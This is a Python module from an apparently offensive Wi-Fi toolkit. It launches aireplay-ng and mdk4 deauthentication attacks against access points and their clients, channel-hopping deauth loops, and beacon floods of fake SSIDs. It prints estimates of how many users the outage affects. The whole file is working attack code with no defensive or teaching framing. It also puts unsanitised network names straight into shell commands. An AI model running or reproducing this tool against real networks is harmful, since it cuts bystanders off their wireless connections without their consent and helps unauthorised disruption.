# ============================================================
# ATTACK - Deauthentication attack functions
# ============================================================

import os
import subprocess
import time

from .config import MAX_TARGETS, DEAUTH_PACKETS, DEAUTH_DELAY, BURST_STAGGER
from .colors import Color
from .thermal import start_thermal_monitor, stop_thermal_monitor
from .interface import lock_channel_robust

# Global state
active_attack_processes = []


def kill_all_attacks():
    """Stop all running attack processes"""
    global active_attack_processes
    
    for proc in active_attack_processes:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            try:
                proc.kill()
            except:
                pass
    active_attack_processes = []
    
    # Stop thermal monitoring
    stop_thermal_monitor()
    
    subprocess.call("pkill -f 'DEAUTH ATTACK'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("pkill -f 'aireplay-ng --deauth'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("pkill -f 'DEAUTH-HOP'", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("pkill -9 mdk4", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def deauth_attack_single_optimized(target, mon_iface, window_index=0, client_mac=None):
    """
    Attack single target WITHOUT setting channel
    (channel should already be locked before calling this)
    If client_mac is provided, target specific client (more effective!)
    
    Uses DEAUTH_PACKETS=0 for continuous attack (most effective)
    """
    global active_attack_processes
    
    # Warn about weak signal
    try:
        pwr = int(target.get('power', -100))
        if pwr < -70:
            print(f"{Color.WARNING}[!] WEAK SIGNAL ({pwr} dBm) - Move closer for better results!{Color.ENDC}")
    except:
        pass
    
    if client_mac:
        title = f"DEAUTH [{window_index+1}] {target['essid'][:10]} → {client_mac[-8:]}"
    else:
        title = f"DEAUTH [{window_index+1}] {target['essid'][:15]} (BROADCAST)"
    
    # Determine packet count (0 = continuous)
    packet_arg = DEAUTH_PACKETS if DEAUTH_PACKETS > 0 else 0
    
    if client_mac:
        # TARGETED deauth - attacks both directions (AP → Client, Client → AP)
        # Sends 128 packets per request (64 to AP + 64 to client)
        # This is MORE EFFECTIVE than broadcast!
        cmd = f"xterm -geometry 100x15+{window_index * 50}+{window_index * 30} " \
              f"-bg black -fg red -title '{title}' -e " \
              f"'aireplay-ng -0 {packet_arg} " \
              f"-a {target['bssid']} " \
              f"-c {client_mac} " \
              f"--ignore-negative-one {mon_iface} " \
              f"|| (echo \"[!] ATTACK FAILED\" && read -p \"Press Enter to close...\")'"
    else:
        # BROADCAST deauth (all clients on AP)
        # WARNING: Some clients IGNORE broadcast deauth!
        cmd = f"xterm -geometry 100x15+{window_index * 50}+{window_index * 30} " \
              f"-bg black -fg red -title '{title}' -e " \
              f"'aireplay-ng -0 {packet_arg} " \
              f"-a {target['bssid']} " \
              f"--ignore-negative-one {mon_iface} " \
              f"|| (echo \"[!] ATTACK FAILED\" && read -p \"Press Enter to close...\")'"
    
    proc = subprocess.Popen(
        cmd, 
        shell=True, 
        stdout=subprocess.DEVNULL, 
        stderr=subprocess.DEVNULL
    )
    active_attack_processes.append(proc)
    
    return proc


def deauth_attack_clients(target_ap, clients, mon_iface):
    """Attack AP with specific client targets"""
    global active_attack_processes
    
    print(f"\n{Color.FAIL}{'='*60}{Color.ENDC}")
    print(f"{Color.FAIL}[CLIENT-TARGETED ATTACK] {target_ap['essid']}{Color.ENDC}")
    print(f"{Color.FAIL}{'='*60}{Color.ENDC}")
    
    # Lock channel
    if not lock_channel_robust(mon_iface, target_ap['channel']):
        print(f"{Color.FAIL}[!] Attack dibatalkan - channel lock gagal{Color.ENDC}")
        return
    
    print(f"\n{Color.CYAN}[*] Targeting {len(clients)} specific clients...{Color.ENDC}")
    print(f"{Color.GREEN}[+] Mode: TARGETED (lebih efektif dari broadcast){Color.ENDC}")
    
    # Display clients
    print(f"\n{Color.CYAN}Clients to attack:{Color.ENDC}")
    for idx, client in enumerate(clients):
        print(f"  [{idx+1}] {client['station_mac']} | PWR: {client['power']} dBm")
    
    # Spawn attack per client (max 5)
    attack_count = min(len(clients), MAX_TARGETS)
    for idx in range(attack_count):
        client = clients[idx]
        deauth_attack_single_optimized(target_ap, mon_iface, idx, client['station_mac'])
        print(f"{Color.GREEN}[✓] Attack #{idx+1}: Client {client['station_mac']}{Color.ENDC}")
        time.sleep(BURST_STAGGER)
    
    print(f"\n{Color.GREEN}{'='*60}{Color.ENDC}")
    print(f"{Color.GREEN}[SUCCESS] {attack_count} targeted attacks running{Color.ENDC}")
    print(f"{Color.GREEN}{'='*60}{Color.ENDC}")
    
    # Start thermal monitoring
    start_thermal_monitor()
    
    print(f"\n{Color.WARNING}[IMPACT]{Color.ENDC}")
    print(f"  • Target AP: {target_ap['essid']}")
    print(f"  • Channel: {target_ap['channel']}")
    print(f"  • Clients attacked: {attack_count}")
    print(f"  • Mode: Directed deauth (64 pkts to AP + 64 pkts to client)")
    
    print(f"\n{Color.WARNING}[!] Close xterm windows OR Ctrl+C to stop{Color.ENDC}")


def deauth_attack_multi(targets, mon_iface):
    """Multi-target attack optimized for same-channel"""
    global active_attack_processes
    
    # Group by channel
    channels = {}
    for t in targets:
        ch = t['channel']
        if ch not in channels:
            channels[ch] = []
        channels[ch].append(t)
    
    print(f"\n{Color.FAIL}{'='*60}{Color.ENDC}")
    print(f"{Color.FAIL}[MULTI-TARGET] {len(targets)} targets{Color.ENDC}")
    print(f"{Color.FAIL}{'='*60}{Color.ENDC}")
    
    # Analyze deployment
    if len(channels) == 1:
        channel = list(channels.keys())[0]
        print(f"{Color.GREEN}[OPTIMAL!] All targets on Channel {channel}{Color.ENDC}")
        print(f"{Color.GREEN}[+] High-Density Mode: ENABLED{Color.ENDC}")
        
        # ✅ FIX: Lock channel 1x BEFORE spawning processes
        if not lock_channel_robust(mon_iface, channel):
            print(f"{Color.FAIL}[!] Attack dibatalkan - channel lock gagal{Color.ENDC}")
            return
        
        # Show channel info
        print(f"\n{Color.CYAN}[*] Verifying lock...{Color.ENDC}")
        os.system(f"iwconfig {mon_iface} | grep -i 'frequency\\|channel'")
        time.sleep(1)
    else:
        print(f"{Color.WARNING}[!] Targets di {len(channels)} channel berbeda!{Color.ENDC}")
        print(f"{Color.WARNING}[!] Efektivitas akan SANGAT berkurang!{Color.ENDC}")
        print(f"{Color.WARNING}[!] Rekomendasi: Pilih target di 1 channel saja{Color.ENDC}")
        
        cont = input(f"\n{Color.BOLD}Lanjut tetap? (y/n): {Color.ENDC}")
        if cont.lower() != 'y':
            return
    
    # Display targets
    print(f"\n{Color.CYAN}Target List:{Color.ENDC}")
    for idx, target in enumerate(targets):
        print(f"  [{idx+1}] {target['essid']:20s} | "
              f"BSSID: {target['bssid']} | "
              f"CH: {target['channel']:2s} | "
              f"PWR: {target['power']:3s} dBm")
    
    print(f"\n{Color.CYAN}[*] Starting attacks (DEAUTH_PACKETS={DEAUTH_PACKETS})...{Color.ENDC}")
    
    # ✅ FIX: Spawn processes WITHOUT setting channel per-process
    for idx, target in enumerate(targets):
        deauth_attack_single_optimized(target, mon_iface, idx)
        print(f"{Color.GREEN}[✓] Attack #{idx+1}: {target['essid']}{Color.ENDC}")
        time.sleep(BURST_STAGGER)  # Stagger for stability
    
    print(f"\n{Color.GREEN}{'='*60}{Color.ENDC}")
    print(f"{Color.GREEN}[SUCCESS] {len(targets)} attacks running{Color.ENDC}")
    print(f"{Color.GREEN}{'='*60}{Color.ENDC}")
    
    # Start thermal monitoring
    start_thermal_monitor()
    
    if len(channels) == 1:
        print(f"\n{Color.WARNING}[IMPACT ESTIMATE]{Color.ENDC}")
        print(f"  • Channel {list(channels.keys())[0]} coverage: DOWN")
        print(f"  • Affected APs: {len(targets)}")
        print(f"  • Estimated users affected: {len(targets) * 20}-{len(targets) * 100}")
        print(f"  • Coverage radius: ~50-100 meters (per AP)")
    
    print(f"\n{Color.WARNING}[!] Close xterm windows OR Ctrl+C to stop{Color.ENDC}")


def parse_target_selection(selection, max_len):
    """Parse user input for target selection (e.g., '1,2,3')"""
    indices = []
    selection = selection.replace(" ", "")
    parts = selection.split(",")
    
    for part in parts:
        part = part.strip()
        if not part:
            continue
            
        if part.isdigit():
            idx = int(part)
            if 1 <= idx <= max_len:
                if idx not in indices:
                    indices.append(idx)
            else:
                print(f"{Color.FAIL}[!] Invalid: {idx} (range: 1-{max_len}){Color.ENDC}")
                return None
        else:
            print(f"{Color.FAIL}[!] Invalid input: '{part}'{Color.ENDC}")
            return None
    
    return indices


def get_active_attack_count():
    """Get the number of active attack processes"""
    return len(active_attack_processes)


def mdk4_beacon_flood(mon_iface, ssid_text, window_index=0, count=1, channel_hop=False):
    """
    Use mdk4 for beacon flooding (Feature 6)
    mdk4 <interface> b -n <ssid>
    
    Args:
        mon_iface: Monitor interface name
        ssid_text: SSID name to broadcast
        window_index: Window position offset
        count: Number of SSIDs to create (1, 2, 3...)
        channel_hop: If True, broadcasts on all channels (2.4GHz + 5GHz)
    """
    global active_attack_processes

    if not ssid_text:
        ssid_text = "Free WiFi"

    print(f"{Color.WARNING}[MDK4] Start Beacon Flood: \"{ssid_text}\"{Color.ENDC}")

    launcher_file = "/tmp/mdk4_beacon.sh"
    
    # Channel definitions for hopping
    CH_24 = "1,2,3,4,5,6,7,8,9,10,11"
    CH_5 = "36,40,44,48,149,153,157,161,165"
    ALL_CHANNELS = f"{CH_24},{CH_5}"
    
    try:
        # Generate launcher script
        with open(launcher_file, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write("echo '=== MDK4 BEACON FLOOD ==='\n")
            
            if count > 1:
                # Multi-SSID Mode
                list_file = "/tmp/mdk4_spam_list.txt"
                with open(list_file, 'w') as lf:
                    for i in range(1, count + 1):
                        lf.write(f"{ssid_text} {i}\n")
                
                print(f"{Color.CYAN}[DEBUG] Generated {count} SSIDs in {list_file}{Color.ENDC}")
                title = f"MDK4 FLOOD [{window_index+1}] {ssid_text} (x{count})"
                
                f.write(f"echo 'SSIDs: {count}'\n")
                
                if channel_hop:
                    # Channel hopping mode - broadcasts on all channels
                    f.write(f"echo 'Mode: CHANNEL HOPPING (All Bands)'\n")
                    f.write(f"echo 'Channels: {ALL_CHANNELS}'\n")
                    f.write("echo '========================'\n")
                    # -c for channel hopping, -h for hop, -s 2000 for speed
                    f.write(f"mdk4 {mon_iface} b -f {list_file} -m -w a -c {ALL_CHANNELS} -s 2000\n")
                else:
                    f.write("echo 'Mode: SINGLE CHANNEL'\n") 
                    f.write("echo '========================'\n")
                    # -s 2000 for HIGH SPEED beacon flood
                    f.write(f"mdk4 {mon_iface} b -f {list_file} -m -w a -h -s 2000\n")
                
            else:
                # Single SSID Mode
                safe_ssid = ssid_text.replace("'", "").replace('"', '')
                title = f"MDK4 FLOOD [{window_index+1}] {ssid_text}"
                
                f.write(f"echo 'SSID: {safe_ssid}'\n")
                
                if channel_hop:
                    # Channel hopping mode
                    f.write(f"echo 'Mode: CHANNEL HOPPING (All Bands)'\n")
                    f.write(f"echo 'Channels: {ALL_CHANNELS}'\n")
                    f.write("echo '========================'\n")
                    f.write(f"mdk4 {mon_iface} b -n \"{safe_ssid}\" -m -w a -c {ALL_CHANNELS} -s 2000\n")
                else:
                    f.write("echo 'Mode: SINGLE CHANNEL'\n")
                    f.write("echo '========================'\n")
                    f.write(f"mdk4 {mon_iface} b -n \"{safe_ssid}\" -m -w a -h -s 2000\n")
                
            f.write("\n")
            f.write("if [ $? -ne 0 ]; then\n")
            f.write("    echo '[!] MDK4 CRASHED OR FAILED'\n")
            f.write("    read -p 'Press Enter to close...'\n")
            f.write("fi\n")
        
        os.chmod(launcher_file, 0o755)
        
        hop_indicator = " [HOP]" if channel_hop else ""
        cmd = f"xterm -geometry 110x22+{window_index * 40}+{window_index * 25} -bg black -fg red -title '{title}{hop_indicator}' -e 'bash {launcher_file}'"
        
    except Exception as e:
        print(f"{Color.FAIL}[!] Failed to create beacon launcher: {e}{Color.ENDC}")
        return None

    proc = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    active_attack_processes.append(proc)
    
    return proc


def mdk4_deauth_hopping(targets, mon_iface, window_index=0):
    """
    MDK4 Deauth Attack with Channel Hopping (Feature 7)
    
    Uses aireplay-ng with dynamic channel switching in a while loop.
    Supports multiple targets across different channels.
    
    Key technique from mdk4_deauth.py:
    - Loop through all targets
    - Switch to each target's channel via iwconfig
    - Send deauth burst
    - Move to next target
    
    Args:
        targets: List of target dicts with 'bssid', 'essid', 'channel'
        mon_iface: Monitor interface name
        window_index: Window position offset
    """
    global active_attack_processes

    # Normalize to list
    if isinstance(targets, dict):
        targets = [targets]

    if not targets:
        print(f"{Color.FAIL}[!] No targets provided{Color.ENDC}")
        return None

    # Get unique channels
    channels = list(set([t.get('channel', '1') for t in targets]))
    
    print(f"{Color.WARNING}[MDK4-HOP] Starting Deauth with Channel Hopping{Color.ENDC}")
    print(f"{Color.CYAN}[*] Targets: {len(targets)}{Color.ENDC}")
    print(f"{Color.CYAN}[*] Channels: {', '.join(channels)}{Color.ENDC}")
    
    # Create launcher script
    launcher_file = "/tmp/mdk4_deauth_hop.sh"
    
    # ANSI color codes for different targets (cycling through colors)
    # Format: \033[<style>;<fg>m
    # Bright colors for better visibility on black background
    COLORS = [
        r'\033[1;32m',  # Bright Green
        r'\033[1;36m',  # Bright Cyan
        r'\033[1;33m',  # Bright Yellow
        r'\033[1;35m',  # Bright Magenta
        r'\033[1;34m',  # Bright Blue
        r'\033[1;31m',  # Bright Red
        r'\033[1;37m',  # Bright White
        r'\033[0;92m',  # Light Green
        r'\033[0;96m',  # Light Cyan
        r'\033[0;93m',  # Light Yellow
    ]
    RESET = r'\033[0m'
    
    try:
        with open(launcher_file, 'w') as f:
            f.write("#!/bin/bash\n\n")
            f.write("# ANSI Color definitions\n")
            f.write("RESET='\\033[0m'\n")
            f.write("BOLD='\\033[1m'\n")
            f.write("HEADER='\\033[1;97m'\n\n")
            
            # Define colors for each target
            for i in range(len(targets)):
                color_code = COLORS[i % len(COLORS)]
                f.write(f"C{i}='{color_code}'\n")
            
            f.write("\n")
            f.write("echo -e \"${HEADER}╔══════════════════════════════════════════════════════════════════════════════╗${RESET}\"\n")
            f.write("echo -e \"${HEADER}║               MDK4 DEAUTH - CHANNEL HOPPING MODE                            ║${RESET}\"\n")
            f.write("echo -e \"${HEADER}╚══════════════════════════════════════════════════════════════════════════════╝${RESET}\"\n")
            f.write(f"echo -e \"Interface: {mon_iface}\"\n")
            f.write(f"echo -e \"Targets: {len(targets)}\"\n")
            f.write(f"echo -e \"Channels: {', '.join(channels)}\"\n")
            f.write("echo ''\n")
            
            # Show target list with colors
            f.write("echo 'Target List (with colors):'\n")
            for i, t in enumerate(targets):
                safe_ssid = t.get('essid', 'Unknown').replace("'", "").replace('"', '')[:20]
                color_var = f"$C{i}"
                f.write(f"echo -e \"  {color_var}[{i+1}] {safe_ssid} ({t['bssid']}) Ch:{t.get('channel', '?')}${{RESET}}\"\n")
            
            f.write("\necho ''\n")
            f.write("echo 'Starting attack loop... (Ctrl+C to stop)'\n")
            f.write("echo '──────────────────────────────────────────────────────────────────────────────'\n")
            f.write("echo ''\n\n")
            
            # Trap for clean exit
            f.write("trap 'echo; echo -e \"${BOLD}Stopping attack...${RESET}\"; exit 0' INT\n\n")
            
            # Main attack loop
            f.write("while true; do\n")
            
            # Add channel switch + deauth for each target with colors
            for i, target in enumerate(targets):
                safe_ssid = target.get('essid', 'Unknown')[:18].replace("'", "").replace('"', '')
                bssid = target['bssid']
                channel = target.get('channel', '1')
                color_var = f"$C{i}"
                
                # Switch channel and send deauth burst with colored output
                f.write(f"\n  # Target {i+1}: {safe_ssid}\n")
                f.write(f"  iwconfig {mon_iface} channel {channel} 2>/dev/null\n")
                f.write(f"  OUTPUT=$(aireplay-ng --deauth 5 -a {bssid} {mon_iface} 2>&1 | grep -E 'DeAuth|ACK|Sending' | head -1)\n")
                f.write(f"  if [ -n \"$OUTPUT\" ]; then\n")
                f.write(f"    echo -e \"{color_var}[Ch:{channel:>3}] {safe_ssid:<18}: $OUTPUT${{RESET}}\"\n")
                f.write(f"  else\n")
                f.write(f"    echo -e \"{color_var}[Ch:{channel:>3}] {safe_ssid:<18}: deauth sent${{RESET}}\"\n")
                f.write(f"  fi\n")
            
            f.write("\ndone\n")
        
        os.chmod(launcher_file, 0o755)
        
        # Build title
        target_names = ",".join([t.get('essid', '?')[:8] for t in targets[:3]])
        if len(targets) > 3:
            target_names += f"+{len(targets)-3}"
        
        title = f"DEAUTH-HOP {target_names}"
        
        # Wider terminal: 120 columns x 30 rows
        cmd = f"xterm -geometry 120x30+{window_index * 30}+{window_index * 20} -bg black -fg white -title '{title}' -e 'bash {launcher_file}'"
        
        print(f"{Color.CYAN}[DEBUG] Script: {launcher_file}{Color.ENDC}")
        
    except Exception as e:
        print(f"{Color.FAIL}[!] Failed to create launcher: {e}{Color.ENDC}")
        return None

    proc = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    active_attack_processes.append(proc)
    
    time.sleep(0.5)  # Give xterm time to start
    
    # Check if xterm is running
    if proc.poll() is not None:
        print(f"{Color.FAIL}[!] XTerm failed to start! Check DISPLAY variable.{Color.ENDC}")
        return None
    
    print(f"{Color.GREEN}[+] Deauth-Hop attack window opened (PID:{proc.pid}){Color.ENDC}")
    print(f"{Color.GREEN}[+] Cycling through {len(targets)} targets on {len(channels)} channel(s){Color.ENDC}")
    
    # Start thermal monitoring
    start_thermal_monitor()
    
    return proc

